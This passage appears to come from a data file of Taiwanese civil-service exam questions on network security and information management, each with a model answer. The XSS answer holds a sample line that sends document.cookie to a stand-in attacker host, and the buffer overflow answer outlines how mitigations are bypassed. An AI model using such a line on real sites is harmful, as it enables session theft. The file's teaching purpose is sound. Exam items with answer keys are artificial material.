            <p>SBOM（Software Bill of Materials）是軟體成分清單，列出應用程式使用的開源套件、版本、相依元件、授權與來源。它可協助組織在漏洞爆發時快速判斷是否受影響，例如某套件出現重大 CVE 時，能立即查出哪些系統使用該版本；也能支援弱點掃描、版本治理、供應商稽核與修補優先順序安排。不過 SBOM 只是可視化工具，仍須搭配簽章驗證、建置流程保護、來源完整性檢查與供應商風險管理。</p>
          </section>`
  },
  {
    "id": 71,
    "slug": "question-71",
    "title": "Firewall、IDS、IPS 與 NGFW 差異分析",
    "points": "20 分",
    "year": "115年",
    "examName": "國家安全情報人員考試",
    "grade": "三等考試",
    "category": "資訊組（選試英文）",
    "subject": "網路應用與安全",
    "subjectSlug": "115-national-security-intelligence-third-network-application-security",
    "order": "三",
    "html": `<div class="question-head">
            <span class="number">三</span>
            <div>
              <h2>Firewall、IDS、IPS 與 NGFW 差異分析</h2>
              <p>配分：20 分</p>
            </div>
          </div>

          <section class="prompt-block">
            <h3>題目</h3>
            <p>企業通常同時部署防火牆（Firewall）、入侵偵測系統（IDS）與入侵防禦系統（IPS）。請分析三者在功能定位、運作方式與回應行為上的差異。（10 分）並說明下一代防火牆（NGFW）如何整合上述功能。（10 分）</p>
          </section>

          <section class="answer-block">
            <h3>三者差異</h3>
            <div class="table-wrap">
              <table>
                <thead><tr><th>項目</th><th>Firewall</th><th>IDS</th><th>IPS</th></tr></thead>
                <tbody>
                  <tr><td>功能定位</td><td>依規則控制流量進出</td><td>偵測可疑或攻擊行為</td><td>偵測並即時阻擋攻擊</td></tr>
                  <tr><td>部署方式</td><td>通常 inline 部署在網路邊界或區段間</td><td>常以旁路監聽方式接收鏡像流量</td><td>通常 inline 部署，流量必須經過設備</td></tr>
                  <tr><td>判斷依據</td><td>IP、Port、Protocol、連線狀態與政策</td><td>特徵碼、異常行為、流量模式</td><td>特徵碼、異常行為、協定檢查與攻擊阻擋規則</td></tr>
                  <tr><td>回應行為</td><td>允許、拒絕、記錄或 NAT</td><td>告警、記錄、通報 SOC</td><td>丟棄封包、重設連線、封鎖來源或隔離</td></tr>
                </tbody>
              </table>
            </div>
            <p>簡言之，Firewall 偏重存取控制，IDS 偏重看見與告警，IPS 則偏重即時防禦。IDS 誤判時影響較小，但只能事後反應；IPS 可即時阻擋，但誤判可能中斷正常服務。</p>
          </section>

          <section class="answer-block">
            <h3>NGFW 的整合</h3>
            <p>下一代防火牆（Next-Generation Firewall, NGFW）在傳統防火牆基礎上加入應用程式辨識、使用者身分整合、深度封包檢測、入侵防禦、惡意程式偵測、URL 過濾、SSL/TLS 檢查與威脅情報。它不只判斷「哪個 IP 連到哪個 Port」，還能判斷「誰、用哪個應用、存取什麼內容、風險多高」。</p>
            <p>例如企業可設定：行銷部門允許使用雲端硬碟下載公開文件，但禁止上傳機敏檔案；若流量符合已知漏洞攻擊特徵，NGFW 可直接套用 IPS 規則阻擋並產生告警。</p>
          </section>`
  },
  {
    "id": 72,
    "slug": "question-72",
    "title": "緩衝區溢位原理、ACE 與現代緩解機制",
    "points": "20 分",
    "year": "115年",
    "examName": "國家安全情報人員考試",
    "grade": "三等考試",
    "category": "資訊組（選試英文）",
    "subject": "網路應用與安全",
    "subjectSlug": "115-national-security-intelligence-third-network-application-security",
    "order": "四",
    "html": `<div class="question-head">
            <span class="number">四</span>
            <div>
              <h2>緩衝區溢位原理、ACE 與現代緩解機制</h2>
              <p>配分：20 分</p>
            </div>
          </div>

          <section class="prompt-block">
            <h3>題目</h3>
            <p>緩衝區溢位（Buffer Overflow）是許多系統漏洞的根源。請解釋其原理，並說明堆疊溢位（Stack Overflow）與堆積溢位（Heap Overflow）的差異。（10 分）請說明攻擊者如何利用此漏洞達成任意程式碼執行（ACE），並列舉兩種現代緩解機制及其常見繞過手法。（10 分）</p>
          </section>

          <section class="answer-block">
            <h3>原理與類型差異</h3>
            <p>緩衝區溢位發生在程式將資料寫入固定大小記憶體區域時，未檢查長度或邊界，導致資料超出緩衝區並覆蓋相鄰記憶體。常見原因包括不安全的 C/C++ 函式、錯誤的長度計算、缺乏輸入驗證或整數溢位造成配置大小不足。</p>
            <ul>
              <li><strong>堆疊溢位：</strong>發生在函式呼叫堆疊上的區域變數，攻擊者可能覆蓋返回位址、函式指標或控制資料，使程式流程跳到攻擊者控制的位置。</li>
              <li><strong>堆積溢位：</strong>發生在動態配置記憶體，如 malloc/new 配置的區域。攻擊者可能破壞 heap metadata、物件欄位、虛擬函式表指標或相鄰物件，進而控制程式行為。</li>
            </ul>
          </section>

          <section class="answer-block">
            <h3>任意程式碼執行與緩解</h3>
            <p>攻擊者通常先控制輸入，使溢位覆蓋控制流程資料；接著將控制流程導向 shellcode、現有函式或由多個小片段組成的 ROP chain，達成任意程式碼執行（Arbitrary Code Execution, ACE）。成功後可取得程序權限、植入後門、竊取資料或橫向移動。</p>
            <ul>
              <li><strong>DEP/NX：</strong>將堆疊或堆積標成不可執行，降低直接執行 shellcode 的可能。常見繞過是 return-to-libc 或 ROP，改用程式既有可執行程式碼片段完成攻擊。</li>
              <li><strong>ASLR：</strong>隨機化程式、函式庫、堆疊與堆積位址，使攻擊者難以預測跳轉位置。常見繞過是資訊洩漏取得實際位址，或利用未隨機化模組。</li>
              <li><strong>Stack Canary：</strong>在返回位址前放置檢查值，若溢位改寫 canary 就中止程式。常見繞過包含洩漏 canary、逐位暴力猜測或改攻擊不含 canary 的控制資料。</li>
            </ul>
          </section>`
  },
  {
    "id": 73,
    "slug": "question-73",
    "title": "XSS 原理、Cookie 竊取與防禦機制",
    "points": "20 分",
    "year": "115年",
    "examName": "國家安全情報人員考試",
    "grade": "三等考試",
    "category": "資訊組（選試英文）",
    "subject": "網路應用與安全",
    "subjectSlug": "115-national-security-intelligence-third-network-application-security",
    "order": "五",
    "html": `<div class="question-head">
            <span class="number">五</span>
            <div>
              <h2>XSS 原理、Cookie 竊取與防禦機制</h2>
              <p>配分：20 分</p>
            </div>
          </div>

          <section class="prompt-block">
            <h3>題目</h3>
            <p>跨站腳本攻擊（Cross-Site Scripting, XSS）是 OWASP Top 10 中常見的網頁應用程式漏洞。請說明 XSS 的攻擊原理，並比較儲存型與反射型的差異。（10 分）請說明攻擊者如何利用 XSS 竊取使用者的 Session Cookie，並列舉至少兩種有效的防禦機制及其原理。（10 分）</p>
          </section>

          <section class="answer-block">
            <h3>攻擊原理與類型</h3>
            <p>XSS 是因網頁應用程式未正確處理不可信輸入，導致攻擊者可把惡意 JavaScript 插入受害者瀏覽器執行。由於腳本在合法網站來源下執行，瀏覽器會允許它讀取頁面內容、操作 DOM、發送請求，甚至在未保護時讀取 Cookie。</p>
            <ul>
              <li><strong>儲存型 XSS：</strong>惡意內容被存入伺服器資料庫或留言、個人檔案、工單等欄位。其他使用者瀏覽該頁時即觸發，影響範圍大且持久。</li>
              <li><strong>反射型 XSS：</strong>惡意內容通常放在 URL 或表單參數中，伺服器立即把輸入反射到回應頁面。攻擊者常透過釣魚連結誘使受害者點擊。</li>
            </ul>
          </section>

          <section class="answer-block">
            <h3>Session Cookie 竊取與防禦</h3>
            <p>若網站將 Session ID 存於可被 JavaScript 讀取的 Cookie，攻擊者可透過 XSS 執行類似 <code>fetch('https://attacker.example/?c=' + document.cookie)</code> 的程式，把 Cookie 傳到攻擊者伺服器。攻擊者取得 Session Cookie 後，可能冒用使用者身分登入系統。</p>
            <ul>
              <li><strong>輸出編碼：</strong>依 HTML、屬性、JavaScript、CSS、URL 等不同情境做正確 escaping，使使用者輸入被當成文字而非程式碼執行。</li>
              <li><strong>輸入驗證與 HTML Sanitization：</strong>對可輸入 HTML 的欄位使用白名單過濾，只允許安全標籤與屬性，移除 script、事件處理器與危險 URL。</li>
              <li><strong>HttpOnly、Secure、SameSite Cookie：</strong>HttpOnly 可阻止 JavaScript 讀取 Cookie；Secure 限制 HTTPS 傳輸；SameSite 可降低跨站請求濫用風險。</li>
              <li><strong>Content Security Policy（CSP）：</strong>限制可載入與可執行腳本來源，禁止 inline script 或要求 nonce/hash，即使有注入點也能降低腳本執行機會。</li>
            </ul>
          </section>`
  },
  {
    "id": 74,
    "slug": "question-74",
    "title": "CVSS 基本指標與 Air-gapped 修補優先順序",
    "points": "25 分",
    "year": "115年",
    "examName": "移民行政人員考試",
    "grade": "三等考試",
    "category": "移民行政類科資訊組",
    "subject": "資通訊及網路安全",
    "subjectSlug": "115-immigration-third-information-communication-network-security",
    "order": "一",
    "html": `<div class="question-head"><span class="number">一</span><div><h2>CVSS 基本指標與 Air-gapped 修補優先順序</h2><p>配分 25 分</p></div></div>
          <section class="prompt-block"><h3>題目</h3><p>在常見漏洞評分系統（Common Vulnerability Scoring System, CVSS）的評分機制中，基本指標組（Base Metric Group）最主要考量那兩個面向？如果一個漏洞的 CVSS 分數很高，但具該漏洞的系統為建置在實體隔離（Air-gapped）的內網環境，應該如何調整對其修補優先順序的判斷並說明原因？</p></section>
          <section class="answer-block"><h3>基本指標組的兩個面向</h3><p>CVSS 的基本指標組主要衡量漏洞本身的固有嚴重性，可分為兩大面向：</p><ul><li><strong>可利用性（Exploitability）：</strong>評估攻擊者利用漏洞的難易度，例如攻擊向量、攻擊複雜度、所需權限，以及是否需要使用者互動。</li><li><strong>影響程度（Impact）：</strong>評估漏洞成功被利用後，對系統機密性、完整性、可用性的損害，也就是對 CIA 三要素的影響。</li></ul></section>
          <section class="answer-block"><h3>Air-gapped 環境下的優先順序</h3><p>若漏洞 CVSS 分數很高，但受影響系統建置於實體隔離的內網環境，修補優先順序可依實際暴露風險適度下修，但不應完全忽略。CVSS Base Score 反映的是漏洞本身的嚴重性，未必完全反映部署環境的可被攻擊機率；Air-gapped 環境降低了外部攻擊者直接經由網際網路利用漏洞的可能性。</p><p>然而仍須考量內部人員威脅、維護筆電、USB、供應鏈感染、誤接網路、權限濫用等風險。實務上應結合環境指標、資產重要性、替代控制措施、維護窗口與業務影響來排序。也就是說，高 CVSS 仍代表漏洞本質嚴重，但實際修補時程可低於暴露於網際網路的同類系統。</p></section>`
  },
  {
    "id": 75,
    "slug": "question-75",
    "title": "熱備援與冷備援復原策略比較",
    "points": "25 分",
    "year": "115年",
    "examName": "移民行政人員考試",
    "grade": "三等考試",
    "category": "移民行政類科資訊組",
    "subject": "資通訊及網路安全",
    "subjectSlug": "115-immigration-third-information-communication-network-security",
    "order": "二",
    "html": `<div class="question-head"><span class="number">二</span><div><h2>熱備援與冷備援復原策略比較</h2><p>配分 25 分</p></div></div>
          <section class="prompt-block"><h3>題目</h3><p>請比較「熱備援」（Hot Site）與「冷備援」（Cold Site）在復原策略上的差異，舉出一個適合使用「冷備援」的業務並說明原因。</p></section>
          <section class="answer-block"><h3>復原策略差異</h3><div class="table-wrap"><table><thead><tr><th>項目</th><th>熱備援 Hot Site</th><th>冷備援 Cold Site</th></tr></thead><tbody><tr><td>準備程度</td><td>備援場地、硬體、網路、系統與資料同步機制大多已建置完成。</td><td>通常只準備場地、電力、空調、網路線路或基本設施。</td></tr><tr><td>復原速度</td><td>可快速切換，RTO 較短，RPO 較小。</td><td>需災後採購、安裝、還原與設定，RTO 較長。</td></tr><tr><td>成本</td><td>建置與維運成本高，需平時維持待命或同步。</td><td>成本低，適合非核心或可延後復原的系統。</td></tr><tr><td>適用情境</td><td>金融交易、身分驗證、即時通關、醫療急救等高可用服務。</td><td>教育訓練、歷史查詢、非即時報表、低頻內部行政系統。</td></tr></tbody></table></div></section>
          <section class="answer-block"><h3>冷備援適用例</h3><p>例如內部教育訓練系統適合採冷備援。此類系統通常不是即時營運核心，短時間中斷不會造成重大公共服務、金錢或安全損害；其 RTO 可較長、RPO 要求也較寬鬆。若使用熱備援，成本可能高於風險降低所帶來的效益，因此採冷備援可在成本與可接受風險之間取得合理平衡。</p></section>`
  },
  {
    "id": 76,
    "slug": "question-76",
    "title": "SAST 與 DAST 技術原理與互補性",
    "points": "25 分",
    "year": "115年",
    "examName": "移民行政人員考試",
    "grade": "三等考試",
    "category": "移民行政類科資訊組",
    "subject": "資通訊及網路安全",
    "subjectSlug": "115-immigration-third-information-communication-network-security",
    "order": "三",
    "html": `<div class="question-head"><span class="number">三</span><div><h2>SAST 與 DAST 技術原理與互補性</h2><p>配分 25 分</p></div></div>
          <section class="prompt-block"><h3>題目</h3><p>在資訊系統開發過程有靜態應用程式安全測試（Static Application Security Testing）與動態應用程式安全測試（Dynamic Application Security Testing）兩種測試。請比較兩者的技術原理，並說明為什麼在資訊安全檢測流程中，兩者應互補使用，不可互相取代？</p></section>
          <section class="answer-block"><h3>技術原理比較</h3><div class="table-wrap"><table><thead><tr><th>項目</th><th>SAST</th><th>DAST</th></tr></thead><tbody><tr><td>分析對象</td><td>原始碼、位元碼或二進位檔。</td><td>執行中的網站、API 或應用程式。</td></tr><tr><td>測試方式</td><td>不執行程式，分析資料流、控制流、危險函式與不安全寫法。</td><td>從外部送出請求，模擬攻擊並觀察實際回應。</td></tr><tr><td>可發現問題</td><td>硬編碼密碼、不安全輸入處理、SQL Injection 或 XSS 風險、危險 API 使用。</td><td>認證繞過、錯誤設定、實際可利用弱點、伺服器錯誤回應與部署風險。</td></tr><tr><td>優點</td><td>可在開發早期發現問題，且能定位到程式碼位置。</td><td>貼近真實攻擊情境，能驗證漏洞在實際環境是否存在。</td></tr><tr><td>限制</td><td>可能誤報，且無法完整反映部署環境。</td><td>較難指出精確程式碼位置，也可能漏掉未被觸發的程式路徑。</td></tr></tbody></table></div></section>
          <section class="answer-block"><h3>為何必須互補</h3><p>SAST 是從內部看程式碼，適合在開發早期找出設計與實作缺陷；DAST 是從外部看執行中的系統，適合驗證部署後的真實攻擊面。只做 SAST 可能忽略伺服器設定、驗證流程、環境差異與實際可利用性；只做 DAST 則可能無法涵蓋所有程式分支，也難以追到根本程式碼位置。</p><p>因此完整的資安檢測流程應在 SDLC 中搭配使用兩者：開發階段以 SAST 早期修補，測試或上線前以 DAST 驗證實際風險，並將結果回饋給開發團隊改善程式與部署設定。</p></section>`
  },
  {
    "id": 77,
    "slug": "question-77",
    "title": "社交工程攻擊技術與防範",
    "points": "25 分",
    "year": "115年",
    "examName": "移民行政人員考試",
    "grade": "三等考試",
    "category": "移民行政類科資訊組",
    "subject": "資通訊及網路安全",
    "subjectSlug": "115-immigration-third-information-communication-network-security",
    "order": "四",
    "html": `<div class="question-head"><span class="number">四</span><div><h2>社交工程攻擊技術與防範</h2><p>配分 25 分</p></div></div>
          <section class="prompt-block"><h3>題目</h3><p>請列舉說明五項社交工程攻擊技術，並分述防範之道。</p></section>
          <section class="answer-block"><h3>常見攻擊技術與防範</h3><div class="table-wrap"><table><thead><tr><th>攻擊技術</th><th>說明</th><th>防範之道</th></tr></thead><tbody><tr><td>釣魚郵件 Phishing</td><td>偽裝成銀行、政府機關、公司通知或系統警示，誘使使用者點擊連結、下載附件或輸入帳密。</td><td>部署郵件過濾與惡意連結檢測，啟用多因素驗證，教育員工辨識寄件者、網址與可疑附件。</td></tr><tr><td>魚叉式釣魚 Spear Phishing</td><td>針對特定個人或單位客製化內容，例如假冒主管要求匯款或假冒 IT 人員要求重設密碼。</td><td>敏感操作採雙人覆核與第二管道確認，限制公開組織資訊，定期演練高風險情境。</td></tr><tr><td>電話詐騙 Vishing</td><td>透過電話假冒客服、主管、稽核或技術支援，要求提供密碼、驗證碼或執行遠端操作。</td><td>不得透過電話提供密碼或一次性驗證碼，建立來電查證程序，異常要求應掛斷後撥打官方電話確認。</td></tr><tr><td>誘餌攻擊 Baiting</td><td>以惡意 USB、免費軟體、破解工具或誘人檔案吸引使用者開啟，進而植入惡意程式。</td><td>禁止使用不明 USB 與未授權軟體，端點啟用裝置控管、防毒與 EDR，落實軟體白名單。</td></tr><tr><td>尾隨進入 Tailgating</td><td>攻擊者跟隨合法員工進入管制區域，可能假裝忘帶識別證、搬運物品或拜訪人員。</td><td>落實一人一卡、訪客登記與識別證制度，員工不替陌生人開門，重要區域加強監視與警衛巡查。</td></tr></tbody></table></div></section>
          <section class="answer-block"><h3>整體防護觀念</h3><p>社交工程攻擊利用人的信任、恐懼、好奇或服從心理，因此防範不能只依賴技術工具。組織應結合安全教育、權限最小化、MFA、端點控管、異常通報流程、敏感作業覆核與定期演練，降低人員被誘騙後造成的實際損害。</p></section>`
  },
  {
    "id": 80,
    "slug": "question-80",
    "title": "線上申辦平台需求分析、測試驗收與維護",
    "points": "25 分",
    "year": "115年",
    "examName": "移民行政人員考試",
    "grade": "三等考試",
    "category": "移民行政類科資訊組",
    "subject": "資訊管理與應用",
    "subjectSlug": "115-immigration-third-information-management-application",
    "order": "一",
    "html": `<div class="question-head"><span class="number">一</span><div><h2>線上申辦平台需求分析、測試驗收與維護</h2><p>配分 25 分</p></div></div>
          <section class="prompt-block"><h3>題目</h3><p>內政部移民署計劃建立線上申辦平台，提供民眾線上提出申請、查詢案件進度等，而署內承辦人員亦可透過後台進行案件審核。請從系統分析與設計角度說明需求蒐集、現行流程盤查與未來流程規劃，包括功能需求、非功能需求與角色權限；並說明上線前測試、驗收條件、資訊安全與個人資料保護查核機制，以及上線後維護機制。</p></section>
          <section class="answer-block"><h3>需求蒐集與 As-Is 盤查</h3><p>此平台同時服務民眾與機關內部承辦人，因此需求蒐集不能只訪談資訊單位，應納入業務單位、櫃檯人員、審核承辦人、主管、客服、資安與個資保護窗口，以及實際申辦民眾或代理人。可採用訪談、工作坊、問卷、現場觀察、既有表單與法規盤點、客服紀錄分析、系統日誌分析等方法，整理使用者旅程與業務痛點。</p><p>As-Is 流程盤查應先畫出現行申辦流程，包括民眾取得表單、填寫資料、臨櫃或郵寄送件、補件通知、承辦分案、資格審查、主管核定、結果通知、歸檔與統計報表。每個步驟需記錄輸入資料、產出文件、使用系統、人工判斷點、法定期限、常見退件原因、個資流向與跨單位介接。如此才能辨識重複輸入、紙本傳遞、狀態不透明、人工查詢耗時、缺乏稽核軌跡等問題。</p></section>
          <section class="answer-block"><h3>To-Be 流程、功能需求與角色權限</h3><p>To-Be 流程應以線上化、流程透明、資料一次輸入、後台分工審核與全程留痕為原則。民眾可登入身分驗證、選擇申辦項目、線上填表、上傳附件、繳費、送出申請、接收補件通知、查詢進度與下載結果。承辦人可在後台收件、分案、檢核附件、要求補件、審查案件、註記審核意見、送主管核定、發送通知與產製統計報表。主管可審核、退回、核准、查詢績效與逾期案件。</p><p>功能需求可分為前台申辦、身分驗證、案件管理、文件上傳、線上繳費、通知服務、後台審核、報表統計、系統管理、介接服務與稽核紀錄。非功能需求則包括可用性、效能、資安、個資保護、可維護性、無障礙、相容性、備援復原、日誌保存與法規遵循。例如尖峰時段仍需維持合理回應時間，附件上傳需防毒與格式檢查，個資欄位需加密或遮罩，系統需支援身分驗證與多因素驗證。</p><p>角色權限應採最小權限與職務分工原則。民眾只能查看與修改自己的草稿或案件；代理人需有授權紀錄；承辦人只能處理分派案件；主管可審核所屬單位案件；系統管理員負責帳號、流程與參數設定，但不得任意查看業務內容；稽核人員可查詢操作紀錄但不可修改案件。權限模型應支援角色基礎存取控制、資料範圍限制、敏感操作雙人覆核與完整稽核軌跡。</p></section>
          <section class="answer-block"><h3>測試、驗收與資安個資查核</h3><p>上線前應完成單元測試、整合測試、系統測試、使用者驗收測試、效能壓力測試、資安測試、備份還原演練、災害復原演練、無障礙與跨瀏覽器測試。驗收條件可包含：主要申辦流程可成功完成，錯誤與補件情境可正確處理，案件狀態與通知一致，報表數字可追溯，權限控管符合職務分工，尖峰負載下回應時間與可用性達標，資安弱點已修補，個資蒐集、處理、利用符合告知與目的限制。</p><p>資訊安全查核應包含原始碼檢測、弱點掃描、滲透測試、身分驗證檢查、權限繞越測試、上傳檔案安全檢查、日誌與異常告警檢查、加密傳輸與憑證設定檢查。個資保護查核應確認蒐集欄位具必要性、告知事項完整、敏感資料有遮罩與加密、資料保存期限明確、下載與匯出有紀錄、測試資料去識別化、委外廠商有保密與資安責任、個資事故通報流程可執行。</p></section>
          <section class="answer-block"><h3>上線後維護機制</h3><p>上線後應建立維運窗口、事件分級、服務水準協議、監控儀表板、定期備份、弱點修補、版本更新、客服回饋處理與需求變更管理。應持續監控系統效能、錯誤率、登入失敗、異常查詢、逾期案件、通知失敗與資安告警。重大功能調整需經需求評估、測試環境驗證、上線排程、回復計畫與使用者公告。對法規變動、表單欄位調整與流程變更，也要有參數化或版本化管理，以降低維護成本。</p></section>`
  },
  {
    "id": 81,
    "slug": "question-81",
    "title": "知識管理系統與生成式 AI 導入注意事項",
    "points": "25 分",
    "year": "115年",
    "examName": "移民行政人員考試",
    "grade": "三等考試",
    "category": "移民行政類科資訊組",
    "subject": "資訊管理與應用",
    "subjectSlug": "115-immigration-third-information-management-application",
    "order": "二",
    "html": `<div class="question-head"><span class="number">二</span><div><h2>知識管理系統與生成式 AI 導入注意事項</h2><p>配分 25 分</p></div></div>
          <section class="prompt-block"><h3>題目</h3><p>請說明組織導入知識管理系統時，應具備哪些核心功能以支援知識蒐集、分類、儲存、查詢、分享、更新與版本管理；若進一步導入生成式 AI 輔助內部知識查詢與客服回覆，請說明資料品質、回覆正確性、個人資料保護、人工覆核與權責分工應注意事項。</p></section>
          <section class="answer-block"><h3>KMS 核心功能</h3><p>知識管理系統的目標，是把分散在文件、信箱、系統、表單、會議紀錄與人員經驗中的知識，轉換成可保存、可搜尋、可分享、可維護的組織資產。核心功能應涵蓋知識蒐集、分類、儲存、檢索、分享、更新、版本與權限管理。</p><ul><li><strong>知識蒐集：</strong>支援文件上傳、網頁編輯、表單化輸入、FAQ 建立、案例紀錄、會議紀錄匯入、外部法規連結與系統資料介接。</li><li><strong>分類與標籤：</strong>以主題、業務類別、適用對象、法規依據、有效日期、機密等級、關鍵字與責任單位建立分類架構。</li><li><strong>儲存與全文檢索：</strong>支援全文搜尋、進階篩選、同義詞、熱門查詢、關聯文件推薦與附件內容索引。</li><li><strong>分享與協作：</strong>提供留言、訂閱、收藏、推薦、權限分享、知識社群與通知機制，促進跨單位知識流通。</li><li><strong>更新與審核：</strong>建立草稿、審核、發布、到期提醒、定期複核、失效下架與責任人制度，避免知識過期。</li><li><strong>版本管理：</strong>保留版本差異、修改者、修改時間、審核紀錄與回復機制，確保知識可追溯。</li><li><strong>權限與稽核：</strong>依角色、單位、機密等級限制檢視與編修，並保存查詢、下載、修改與刪除紀錄。</li></ul></section>
          <section class="answer-block"><h3>導入生成式 AI 的資料品質與正確性</h3><p>若 KMS 導入生成式 AI，可用於自然語言查詢、摘要、客服草稿、法規問答與知識推薦，但前提是資料品質要可控。應先清理重複、過期、矛盾、來源不明與格式不一致的知識，為每筆資料加上來源、版本、有效日期、責任單位與可信等級。對法律、權益、費用、資格條件等高風險內容，應引用正式文件或法規條文，避免模型依不完整資料自行推論。</p><p>回覆正確性方面，建議採用檢索增強生成，也就是先從 KMS 找出相關文件，再由 AI 依引用內容產生答案。回覆應附來源連結、文件版本與更新日期，並在信心不足或查無依據時明確回覆無法判斷，而不是猜測。系統也應設計禁答範圍、敏感詞檢查、回覆品質抽驗、錯誤回報與知識修正流程。</p></section>
          <section class="answer-block"><h3>個資保護、人工覆核與權責分工</h3><p>個人資料保護上，KMS 與 AI 查詢不應把民眾姓名、身分證字號、聯絡方式、案件內容等個資不必要地送入模型。應採資料最小化、去識別化、遮罩、存取控管、加密傳輸、日誌保存與外部模型服務合約審查。若使用雲端或外部 AI 服務，必須確認資料是否用於訓練、保存多久、是否跨境傳輸、是否可刪除，以及是否符合機關資安與個資規範。</p><p>人工覆核方面，AI 可作為草稿與輔助查詢，不宜直接取代承辦判斷。涉及人民權益、行政處分、法規解釋、申辦資格與客服正式回覆時，應由承辦人或主管確認後發布。權責分工可設計為：知識擁有單位負責內容正確與更新；資訊單位負責系統維運與資安；資安與個資窗口負責合規查核；客服或業務單位負責回覆品質；主管負責高風險回覆審核；稽核單位定期檢視使用紀錄與錯誤案例。</p></section>`
  },
  {
    "id": 82,
    "slug": "question-82",
    "title": "系統取得方式比較與行動雲端客服治理",
    "points": "25 分",
    "year": "115年",
    "examName": "移民行政人員考試",
    "grade": "三等考試",
    "category": "移民行政類科資訊組",
    "subject": "資訊管理與應用",
    "subjectSlug": "115-immigration-third-information-management-application",
    "order": "三",
    "html": `<div class="question-head"><span class="number">三</span><div><h2>系統取得方式比較與行動雲端客服治理</h2><p>配分 25 分</p></div></div>
          <section class="prompt-block"><h3>題目</h3><p>某中型組織準備汰換既有資訊系統，並希望新增行動服務與線上客服功能。請比較自行開發、委外開發、套裝軟體或雲端服務在成本、時程、彈性、維護、資安與組織配合等面向的優點與限制；並說明導入行動服務與雲端智慧客服系統時，如何從技術、法規與資訊倫理面確保服務品質、資訊安全、個人資料保護及資料合理使用。</p></section>
          <section class="answer-block"><h3>系統取得方式比較</h3><table><thead><tr><th>面向</th><th>自行開發</th><th>委外開發</th><th>套裝軟體或雲端服務</th></tr></thead><tbody><tr><td>成本</td><td>需投入內部人力、開發工具、測試與維運成本，初期負擔較高，但長期可掌握技術資產。</td><td>初期可用契約控管費用，但需求變更、維護與擴充常產生追加成本。</td><td>初期導入成本較低，採授權或訂閱付費，但長期授權、用量與資料搬遷成本需評估。</td></tr><tr><td>時程</td><td>若內部熟悉業務與技術可快速調整，但大型系統開發期較長。</td><td>可利用廠商經驗縮短開發，但需求確認、驗收與溝通會影響時程。</td><td>標準功能可快速上線，客製化與資料轉換可能拉長導入時間。</td></tr><tr><td>彈性</td><td>最能貼近特殊流程，修改彈性高。</td><td>可客製，但受契約、廠商能力與文件品質限制。</td><td>標準化程度高，彈性受產品架構與 API 限制。</td></tr><tr><td>維護</td><td>需有內部技術能力，否則人員異動會造成風險。</td><td>維護可委由廠商，但可能形成廠商鎖定。</td><td>供應商負責平台更新與基礎設施，但組織需管理設定、權限、資料與合約。</td></tr><tr><td>資安</td><td>可自行掌握架構與資料，但也必須自行負責弱點修補與監控。</td><td>需在契約中規範原始碼、弱掃、滲測、保密與事件通報責任。</td><td>需審查供應商資安認證、資料所在地、備援、加密、存取紀錄與服務可用性。</td></tr><tr><td>組織配合</td><td>需業務與資訊人員深度投入，適合有成熟資訊團隊者。</td><td>需建立需求窗口與變更管理，避免業務與廠商認知落差。</td><td>常需調整內部流程以配合產品標準，組織變革與教育訓練很重要。</td></tr></tbody></table></section>
          <section class="answer-block"><h3>導入行動服務與雲端智慧客服的治理</h3><p>技術面應確保服務可用、穩定、安全且可監控。行動服務需採響應式設計或原生 App，支援身分驗證、多因素驗證、裝置安全檢查、傳輸加密、API 權限控管、憑證釘選、輸入驗證與敏感資料不落地。雲端客服需整合知識庫、工單系統與人工客服，提供服務監控、流量控管、異常告警、備援、備份與災害復原。AI 回覆應保留對話紀錄、來源引用、信心分數與轉人工機制。</p><p>法規面需遵守個人資料保護、資通安全、政府或產業主管機關規範、委外管理與雲端服務契約要求。個資蒐集應有明確目的與告知，僅蒐集必要資料，限制使用範圍與保存期限，並提供查詢、更正、刪除或停止利用的程序。若客服資料含個資或敏感內容，應進行遮罩、去識別化、權限分級、加密保存與存取稽核。</p><p>資訊倫理方面，應避免把 AI 客服包裝成真人而誤導使用者，應告知使用者其正在與 AI 互動。不得將民眾資料用於與申辦目的無關的分析或商業用途；不得讓模型以偏見、歧視或未經證實的內容回覆。對可能影響權益的答案，應提示以正式公告或承辦人確認為準，並提供申訴、轉人工與錯誤更正管道。</p></section>`
  },
  {
    "id": 83,
    "slug": "question-83",
    "title": "跨單位資料平台與 AI 預警模型治理",
    "points": "25 分",
    "year": "115年",
    "examName": "移民行政人員考試",
    "grade": "三等考試",
    "category": "移民行政類科資訊組",
    "subject": "資訊管理與應用",
    "subjectSlug": "115-immigration-third-information-management-application",
    "order": "四",
    "html": `<div class="question-head"><span class="number">四</span><div><h2>跨單位資料平台與 AI 預警模型治理</h2><p>配分 25 分</p></div></div>
          <section class="prompt-block"><h3>題目</h3><p>請說明跨單位資料平台在組織管理與決策支援上可發揮哪些功能，並說明建置時應如何確保資料品質、資料一致性、權限控管與資料共享合理性。若平台進一步導入 AI 預警模型，請說明可能效益，以及組織在資料偏誤、模型誤判、可解釋性、責任歸屬與民眾權益保障方面應建立哪些管理配套。</p></section>
          <section class="answer-block"><h3>平台功能與資料治理</h3><p>跨單位資料平台可把不同部門、不同系統、不同格式的資料整合成可管理、可查詢、可分析的共同資料資產。在組織管理上，它可支援資料共享、流程協同、案件追蹤、績效管理、資源配置與風險監控。在決策支援上，它可提供儀表板、趨勢分析、地理資訊分析、異常偵測、預測分析、政策成效評估與高風險案件篩選。</p><p>資料品質需從來源端開始管理，包括資料標準、欄位定義、格式規則、必填檢核、重複資料比對、錯誤資料回報、資料更新頻率與品質指標。平台應建立資料目錄、資料字典、主資料管理與資料血緣，讓使用者知道資料來源、更新時間、定義、限制與責任單位。</p><p>資料一致性可透過共同代碼、統一識別碼、資料轉換規則、版本控管、同步機制與跨系統對帳來確保。權限控管應採最小權限、角色分級、資料分級、欄位遮罩與用途限制。資料共享必須確認法源依據、業務必要性、使用目的、資料範圍、保存期限、再利用限制與稽核方式。</p></section>
